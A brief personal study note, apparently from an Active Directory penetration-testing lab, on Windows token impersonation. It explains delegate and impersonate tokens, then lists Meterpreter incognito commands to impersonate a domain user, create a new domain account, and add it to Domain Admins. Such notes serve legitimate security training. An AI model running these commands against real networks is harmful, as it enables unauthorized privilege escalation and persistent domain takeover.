# Token Impersonation

## Tokens
- Temporary keys that allow you access ti a system/network without having to provide credentials each time you access a file (Cookies for computers)

### Two Types
#### Delegate
- Created for logging into a machine or using Remote Desktop
#### Impersonate
- "non-interactive" such as attaching a network drive or a domain login scipt

## Attack time

- get shell via [psexec](C:\Users\felix\Documents\Notes\ADDS\InitialAttackVectors\GainingShellAccess)
```bash
load incocognito
```
```bash
impersonate_token marvel\\fcastle
```
- "\\\\" for character escaping

### Add user

```bash
net user /add hawkeye Password1@ /domain
```
### Elevate User
```bash
net group "Domain Admins" hawkeye /add /domain
```